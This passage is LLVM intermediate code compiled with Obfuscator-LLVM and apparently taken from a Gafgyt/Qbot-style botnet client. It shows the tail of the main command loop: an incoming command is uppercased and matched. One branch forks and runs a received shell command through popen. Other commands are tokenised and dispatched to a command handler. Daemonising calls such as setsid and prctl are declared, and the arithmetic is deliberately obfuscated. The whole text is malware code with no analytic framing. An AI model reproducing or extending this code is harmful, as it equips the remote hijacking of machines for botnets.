; <label>:294:                                    ; preds = %289
  %295 = load i8*, i8** %15, align 8
  store i8 0, i8* %295, align 1
  %296 = load i8*, i8** %15, align 8
  %297 = getelementptr inbounds i8, i8* %296, i32 1
  store i8* %297, i8** %15, align 8
  %298 = load i8*, i8** %17, align 8
  store i8* %298, i8** %18, align 8
  br label %299

; <label>:299:                                    ; preds = %303, %294
  %300 = load i8*, i8** %18, align 8
  %301 = load i8, i8* %300, align 1
  %302 = icmp ne i8 %301, 0
  br i1 %302, label %303, label %312

; <label>:303:                                    ; preds = %299
  %304 = load i8*, i8** %18, align 8
  %305 = load i8, i8* %304, align 1
  %306 = zext i8 %305 to i32
  %307 = call i32 @toupper(i32 %306) #10
  %308 = trunc i32 %307 to i8
  %309 = load i8*, i8** %18, align 8
  store i8 %308, i8* %309, align 1
  %310 = load i8*, i8** %18, align 8
  %311 = getelementptr inbounds i8, i8* %310, i32 1
  store i8* %311, i8** %18, align 8
  br label %299

; <label>:312:                                    ; preds = %299
  %313 = load i8*, i8** %17, align 8
  %314 = call i32 @strcmp(i8* %313, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.70, i32 0, i32 0)) #10
  %315 = icmp eq i32 %314, 0
  br i1 %315, label %316, label %339

; <label>:316:                                    ; preds = %312
  %317 = call i32 @listFork()
  %318 = icmp ne i32 %317, 0
  br i1 %318, label %319, label %320

; <label>:319:                                    ; preds = %316
  br label %86

; <label>:320:                                    ; preds = %316
  %321 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %321, i8 0, i64 1024, i32 16, i1 false)
  %322 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %323 = load i8*, i8** %15, align 8
  %324 = call i32 (i8*, i8*, ...) @szprintf(i8* %322, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.71, i32 0, i32 0), i8* %323)
  %325 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %326 = call i32 @fdpopen(i8* %325, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.72, i32 0, i32 0))
  store i32 %326, i32* %20, align 4
  br label %327

; <label>:327:                                    ; preds = %332, %320
  %328 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  %329 = load i32, i32* %20, align 4
  %330 = call i8* @fdgets(i8* %328, i32 1024, i32 %329)
  %331 = icmp ne i8* %330, null
  br i1 %331, label %332, label %336

; <label>:332:                                    ; preds = %327
  %333 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @trim(i8* %333)
  %334 = getelementptr inbounds [1024 x i8], [1024 x i8]* %19, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %334, i8 0, i64 1024, i32 16, i1 false)
  %335 = call i32 @sleep(i32 1)
  br label %327

; <label>:336:                                    ; preds = %327
  %337 = load i32, i32* %20, align 4
  %338 = call i32 @fdpclose(i32 %337)
  call void @exit(i32 0) #14
  unreachable

; <label>:339:                                    ; preds = %312
  store i32 1, i32* %22, align 4
  %340 = load i8*, i8** %15, align 8
  %341 = call i8* @strtok(i8* %340, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0)) #2
  store i8* %341, i8** %23, align 8
  %342 = load i8*, i8** %17, align 8
  %343 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %342, i8** %343, align 16
  br label %344

; <label>:344:                                    ; preds = %384, %339
  %345 = load i8*, i8** %23, align 8
  %346 = icmp ne i8* %345, null
  br i1 %346, label %347, label %386

; <label>:347:                                    ; preds = %344
  %348 = load i8*, i8** %23, align 8
  %349 = load i8, i8* %348, align 1
  %350 = zext i8 %349 to i32
  %351 = icmp ne i32 %350, 10
  br i1 %351, label %352, label %384

; <label>:352:                                    ; preds = %347
  %353 = load i8*, i8** %23, align 8
  %354 = call i64 @strlen(i8* %353) #10
  %355 = sub i64 %354, 5287997628123110108
  %356 = add i64 %355, 1
  %357 = add i64 %356, 5287997628123110108
  %358 = add i64 %354, 1
  %359 = call noalias i8* @malloc(i64 %357) #2
  %360 = load i32, i32* %22, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %361
  store i8* %359, i8** %362, align 8
  %363 = load i32, i32* %22, align 4
  %364 = sext i32 %363 to i64
  %365 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %364
  %366 = load i8*, i8** %365, align 8
  %367 = load i8*, i8** %23, align 8
  %368 = call i64 @strlen(i8* %367) #10
  %369 = add i64 %368, 6484419984837415675
  %370 = add i64 %369, 1
  %371 = sub i64 %370, 6484419984837415675
  %372 = add i64 %368, 1
  call void @llvm.memset.p0i8.i64(i8* %366, i8 0, i64 %371, i32 1, i1 false)
  %373 = load i32, i32* %22, align 4
  %374 = sext i32 %373 to i64
  %375 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %374
  %376 = load i8*, i8** %375, align 8
  %377 = load i8*, i8** %23, align 8
  %378 = call i8* @strcpy(i8* %376, i8* %377) #2
  %379 = load i32, i32* %22, align 4
  %380 = sub i32 %379, 128616888
  %381 = add i32 %380, 1
  %382 = add i32 %381, 128616888
  %383 = add nsw i32 %379, 1
  store i32 %382, i32* %22, align 4
  br label %384

; <label>:384:                                    ; preds = %352, %347
  %385 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.73, i32 0, i32 0)) #2
  store i8* %385, i8** %23, align 8
  br label %344

; <label>:386:                                    ; preds = %344
  %387 = load i32, i32* %22, align 4
  %388 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %387, i8** %388)
  %389 = load i32, i32* %22, align 4
  %390 = icmp sgt i32 %389, 1
  br i1 %390, label %391, label %408

; <label>:391:                                    ; preds = %386
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  br label %392

; <label>:392:                                    ; preds = %401, %391
  %393 = load i32, i32* %24, align 4
  %394 = load i32, i32* %22, align 4
  %395 = icmp slt i32 %393, %394
  br i1 %395, label %396, label %407

; <label>:396:                                    ; preds = %392
  %397 = load i32, i32* %24, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %398
  %400 = load i8*, i8** %399, align 8
  call void @free(i8* %400) #2
  br label %401

; <label>:401:                                    ; preds = %396
  %402 = load i32, i32* %24, align 4
  %403 = sub i32 %402, 674114994
  %404 = add i32 %403, 1
  %405 = add i32 %404, 674114994
  %406 = add nsw i32 %402, 1
  store i32 %405, i32* %24, align 4
  br label %392

; <label>:407:                                    ; preds = %392
  br label %408

; <label>:408:                                    ; preds = %407, %386
  br label %409

; <label>:409:                                    ; preds = %408, %205
  br label %86

; <label>:410:                                    ; preds = %86
  %411 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i32 0, i32 0))
  br label %79
                                                  ; No predecessors!
  %413 = load i32, i32* %3, align 4
  ret i32 %413
}

declare i32 @prctl(...) #3

; Function Attrs: nounwind
declare i32 @setsid() #4

; Function Attrs: nounwind
declare i32 @chdir(i8*) #4

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #4

declare i32 @sleep(i32) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { argmemonly nounwind }
attributes #6 = { nounwind returns_twice "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #10 = { nounwind readonly }
attributes #11 = { nounwind returns_twice }
attributes #12 = { noreturn }
attributes #13 = { nounwind readnone }
attributes #14 = { noreturn nounwind }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146612883}
!2 = !{i32 -2146612192}
!3 = !{i32 -2146611443}
!4 = !{i32 -2146610620}
!5 = !{i32 -2146609800}
!6 = !{i32 -2146608456}
!7 = !{i32 -2146607594}
!8 = !{i32 -2146606873}
